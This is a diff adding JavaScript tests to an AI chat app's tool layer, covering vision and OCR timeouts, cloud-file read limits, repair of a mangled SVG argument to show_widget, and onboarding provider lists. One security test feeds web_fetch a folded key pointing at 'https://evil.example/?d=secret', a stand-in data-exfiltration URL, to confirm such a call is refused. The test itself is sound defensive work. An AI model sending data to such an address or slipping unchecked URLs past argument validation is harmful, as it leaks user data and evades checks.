@@ -885,6 +885,48 @@ section('a model that cannot see is read to, not left guessing');
     check('  and says it is the words only', /words only/.test(read.text));
     const none = await see({ userId: null, images: [{ mime: 'image/png', data: 'AA==' }], ocr: async () => ({ text: '', confidence: 0 }) }).catch((e) => e.message);
     check('a picture with no text and no reader says so', /no text in it/.test(String(none)), String(none));
+
+    /*
+     * Screenshots 10–11 (owner, 2026-10-25): "Đọc sheet.jpg" ran for half an
+     * hour. A free vision model that never answers was waited on with no limit,
+     * the function was cut off at 300 s, and the read began again. Every model
+     * now has its own limit, the whole look has one, and so does OCR.
+     */
+    const hangs = (signal) =>
+      new Promise((_, reject) => {
+        signal?.addEventListener('abort', () => reject(Object.assign(new Error('aborted'), { name: 'AbortError' })), { once: true });
+      });
+    const streamer = (answers) =>
+      async function* stream({ entry, signal }) {
+        if (answers[entry.id] === 'hang') await hangs(signal);
+        yield { type: 'text', delta: answers[entry.id] };
+        yield { type: 'done', usage: null };
+      };
+    const engines = [{ id: 'slow', label: 'Slow' }, { id: 'fast', label: 'Fast' }];
+    const limits = { engineMs: 250, totalMs: 1500, ocrMs: 300 };
+    let t0 = Date.now();
+    const skipped = await see({ userId: null, images: [{ mime: 'image/png', data: 'AA==' }], engines, limits, stream: streamer({ slow: 'hang', fast: 'A blue wagon.' }), ocr: async () => ({ text: '', confidence: 0 }) });
+    check('a vision model that does not answer is left after its own limit, and the next one reads it', skipped.model === 'Fast' && /blue wagon/.test(skipped.text) && Date.now() - t0 < 1200, `${skipped.model} in ${Date.now() - t0} ms`);
+    t0 = Date.now();
+    const allHang = await see({ userId: null, images: [{ mime: 'image/png', data: 'AA==' }], engines: [{ id: 'a', label: 'A' }, { id: 'b', label: 'B' }, { id: 'c', label: 'C' }, { id: 'd', label: 'D' }], limits: { engineMs: 400, totalMs: 700, ocrMs: 300 }, stream: streamer({ a: 'hang', b: 'hang', c: 'hang', d: 'hang' }), ocr: async () => ({ text: 'BMW M5 Touring', confidence: 90 }) });
+    check('  when none answers, the whole look ends in its own time, with the words OCR read', allHang.model === 'Tesseract OCR' && /BMW M5 Touring/.test(allHang.text) && Date.now() - t0 < 1400, `${allHang.model} in ${Date.now() - t0} ms`);
+    t0 = Date.now();
+    const ocrHangs = await see({ userId: null, images: [{ mime: 'image/png', data: 'AA==' }], engines, limits, stream: streamer({ slow: 'Read it.', fast: 'x' }), ocr: () => new Promise(() => {}) });
+    check('  and OCR that never finishes is not waited on either', ocrHangs.model === 'Slow' && Date.now() - t0 < 1000, `${ocrHangs.model} in ${Date.now() - t0} ms`);
+    const stopped = new AbortController();
+    setTimeout(() => stopped.abort(), 100);
+    const byStop = await see({ userId: null, images: [{ mime: 'image/png', data: 'AA==' }], engines, limits: { engineMs: 5000, totalMs: 9000, ocrMs: 300 }, signal: stopped.signal, stream: streamer({ slow: 'hang', fast: 'x' }), ocr: async () => ({ text: '', confidence: 0 }) }).catch((e) => e);
+    check('  while Stop still stops it at once, rather than trying the next model', byStop instanceof Error && byStop.name === 'AbortError', String(byStop?.message || byStop?.model));
+  }
+  {
+    // The picture on the cloud computer is fetched with a limit too.
+    const { CLOUD_IMPLEMENTATIONS } = await import('../server/tools/cloud.js');
+    const t0 = Date.now();
+    const slowMachine = await CLOUD_IMPLEMENTATIONS.look_at(
+      { path: '/tmp/m5/sheet.jpg', question: 'Màu xe?' },
+      { userId: 'u-look', chatId: null, readMs: 200, readCloudFile: (_u, _p, { signal }) => new Promise((_, reject) => signal?.addEventListener('abort', () => reject(Object.assign(new Error('aborted'), { name: 'AbortError' })), { once: true })) },
+    ).catch((e) => e.message);
+    check('a cloud computer slow to hand over the picture is given up on, and said so', /took more than/.test(String(slowMachine)) && /sheet\.jpg/.test(String(slowMachine)) && Date.now() - t0 < 1500, String(slowMachine));
   }
   check('an unknown family still qualifies, last', vision.rank('acme/unknown-vl') === vision.PREFERENCE.length);
   {
@@ -1138,6 +1180,50 @@ section('a list sent wrapped as XML-turned-JSON is read, not refused');
   check('an index-keyed object is read in order', indexed.ok && indexed.input.tasks.join() === 'a,b');
 }
 
+/**
+ * Screenshot 8 (owner, 2026-10-25): a model wrote the drawing's opening tag as
+ * the argument's name — `<svg viewBox="0 0 640 240" …>` became the key
+ * "svg viewBox=…" with the inside of the drawing as its value — and show_widget
+ * refused with "Give either `svg` or `html`" although the whole picture was
+ * there. It is put back together, and said so.
+ */
+section('a drawing whose opening tag became the argument\'s name is put back together');
+{
+  const { readArguments } = await import('../server/tools/validate.js');
+  const validateArguments = (schema, input) => readArguments('show_widget', schema, input);
+  const { CLOUD_IMPLEMENTATIONS } = await import('../server/tools/cloud.js');
+  const schema = TOOLS_BY_NAME.show_widget.parameters;
+  const call = {
+    title: 'Quy trình làm việc của Synapsez',
+    'svg viewBox="0 0 640 240" xmlns="http://www.w3.org/2000/svg" font-family="system-ui, sans-serif"':
+      '<defs><marker id="a"><path d="M0,0 L0,6 L9,3 z"/></marker></defs><rect x="16" y="60" width="104" height="62" rx="10"/><text x="68" y="86">Bạn đặt yêu cầu</text>',
+  };
+  /*
+   * Only show_widget's drawing (security review, 2026-10-25): the checks before
+   * a call runs — an address carrying personal data, a message already sent —
+   * read the arguments as they arrived. A folded `url …` key repaired only at
+   * run time would have been a url nobody checked.
+   */
+  const folded = readArguments('web_fetch', TOOLS_BY_NAME.web_fetch.parameters, { 'url data-x="1"': 'https://evil.example/?d=secret' });
+  check('a folded key is never repaired for any other tool or argument — it stays missing, and the call is refused', folded.ok === false && /url/.test(folded.error || ''), JSON.stringify(folded));
+  const checked = validateArguments(schema, call);
+  check('the call passes', checked.ok, checked.error);
+  const svg = String(checked.input?.svg || '');
+  check('the drawing has its <svg> element back, with its attributes', /^<svg viewBox="0 0 640 240" xmlns="http:\/\/www\.w3\.org\/2000\/svg" font-family="system-ui, sans-serif">/.test(svg) && svg.endsWith('</svg>'), svg.slice(0, 120));
+  check('  holding what was inside it', svg.includes('<rect x="16"') && svg.includes('Bạn đặt yêu cầu'));
+  check('  and the folded key is gone', !Object.keys(checked.input || {}).some((k) => k.startsWith('svg ')), Object.keys(checked.input || {}).join(' | '));
+  check('  and the model is told what happened', /svg/.test((checked.notes || []).join(' ')) && /name/.test((checked.notes || []).join(' ')), (checked.notes || []).join(' '));
+  const drawn = await CLOUD_IMPLEMENTATIONS.show_widget(checked.input, {});
+  check('and show_widget draws it', drawn?.widget?.markup?.startsWith('<svg'), JSON.stringify(drawn).slice(0, 160));
+
+  // Inside parts with no <svg> round them are a drawing too.
+  const bare = await CLOUD_IMPLEMENTATIONS.show_widget({ title: 'Flow', svg: '<rect x="0" y="0" width="10" height="10"/><text x="2" y="8">A</text>' }, {});
+  check('svg parts sent without their <svg> element are wrapped in one', /^<svg [^>]*xmlns="http:\/\/www\.w3\.org\/2000\/svg"[^>]*>/.test(bare?.widget?.markup || '') && bare.widget.markup.includes('<rect'), (bare?.widget?.markup || '').slice(0, 100));
+  // An ordinary unknown key is left alone: only a declared name plus attributes is a folded tag.
+  const other = validateArguments(schema, { title: 'x', svg: '<svg></svg>', 'note about it': 'y' });
+  check('an unrelated stray key is not mistaken for one', other.ok && other.input['note about it'] === 'y' && other.input.svg === '<svg></svg>');
+}
+
 section('a page\'s own pictures can be shown, and nothing else can');
 {
   const { pageImages } = await import('../server/tools/cloud.js');
@@ -1354,13 +1440,25 @@ section('the getting-started guide says only what is true');
 {
   const { vi } = await import('../public/js/locales/vi.js');
   const { en } = await import('../public/js/locales/en.js');
-  const { PROVIDERS } = await import('../server/providers/catalog.js');
+  const { PROVIDERS, OFFERED_KEY_PROVIDERS } = await import('../server/providers/catalog.js');
   const { cloudBudgets } = await import('../server/sandbox.js');
-  const labels = Object.values(PROVIDERS).map((p) => p.label);
+  // The providers Settings offers a key for — Anthropic's and OpenAI's own keys
+  // are no longer offered; their models come through the two routers (owner, 2026-10-25).
+  const labels = OFFERED_KEY_PROVIDERS.map((id) => PROVIDERS[id].label);
+  const retired = Object.keys(PROVIDERS).filter((id) => !OFFERED_KEY_PROVIDERS.includes(id)).map((id) => PROVIDERS[id].label);
+  check('Anthropic and OpenAI are the providers whose own key is no longer offered', retired.join() === 'Anthropic,OpenAI', retired.join());
+  {
+    const { keyProviderMeta } = await import('../server/providers/catalog.js');
+    const none = Object.keys(keyProviderMeta({}));
+    check('Settings offers only those three keys to an account that holds no other', none.join() === 'google,openrouter,orcarouter', none.join());
+    // An account that saved an Anthropic key before still sees it — to see it is there and to take it away.
+    const held = Object.keys(keyProviderMeta({ anthropic: { own: true, keys: [{ position: 1 }] }, openai: { own: false, shared: true } }));
+    check('…and still shows a key the account already holds, but not a deployment-wide one', held.join() === 'anthropic,google,openrouter,orcarouter', held.join());
+  }
   for (const [lang, dict] of [['vi', vi], ['en', en]]) {
     const many = String(dict['onb.2.many'] || '');
-    check(`${lang}: the key step names every provider there is`, labels.every((label) => many.includes(label)), `${labels.filter((l) => !many.includes(l)).join(', ')} missing from: ${many}`);
-    const named = ['Mistral', 'Groq', 'DeepSeek', 'Cohere', 'xAI', 'Azure'].filter((other) => many.includes(other));
+    check(`${lang}: the key step names every provider Settings offers`, labels.every((label) => many.includes(label)), `${labels.filter((l) => !many.includes(l)).join(', ')} missing from: ${many}`);
+    const named = ['Mistral', 'Groq', 'DeepSeek', 'Cohere', 'xAI', 'Azure', ...retired].filter((other) => many.includes(other));
     check(`${lang}:   and none there is not`, named.length === 0, named.join(', '));
     const limits = String(dict['onb.3.limits'] || '');
     check(`${lang}: the free limits are OpenRouter's own figures`, /\b20\b/.test(limits) && /\b50\b/.test(limits) && /1[.,]000/.test(limits), limits);
